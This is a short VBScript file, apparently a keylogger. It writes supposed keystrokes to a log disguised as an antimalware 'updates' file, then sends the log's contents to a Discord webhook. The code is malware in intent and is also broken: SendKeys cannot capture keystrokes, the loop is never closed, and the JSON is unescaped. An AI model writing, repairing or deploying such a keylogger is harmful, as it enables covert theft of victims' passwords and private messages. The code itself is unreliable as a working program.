Set objShell = CreateObject("WScript.Shell")
Set objFSO = CreateObject("Scripting.FileSystemObject")
Set objFile = objFSO.CreateTextFile("C:\lenziAntiMalware\2023\lenziINC\updates.lse", True)

Const VK_RETURN = &HD
Const VK_BACK = &H8
Const VK_SHIFT = &H10

While True
    For i = 1 to 255
        If objShell.SendKeys("{ASC " & i & "}") Then
            If i = VK_RETURN Then
                objFile.WriteLine("[ENTER]")
            ElseIf i = VK_BACK Then
                objFile.WriteLine("[BACKSPACE]")
            ElseIf i = VK_SHIFT Then
                objFile.WriteLine("[SHIFT]")
            Else
                objFile.WriteLine(Chr(i))
            End If
        End If
    Next

Dim HttpReq, Message, WebhookURL
Set fso = CreateObject("Scripting.FileSystemObject")
Set file = fso.OpenTextFile("C:\lenziAntiMalware\2023\lenziINC\updates.lse")
tu = file.ReadAll
Message = tu
WebhookURL = "https://discord.com/api/webhooks/WEBHOOK_ID/WEBHOOK_TOKEN"

Set HttpReq = CreateObject("MSXML2.XMLHTTP")

HttpReq.Open "POST", WebhookURL, False
HttpReq.SetRequestHeader "Content-Type", "application/json"

Dim Payload
Payload = "{""content"": """ & Message & """}"

HttpReq.Send Payload
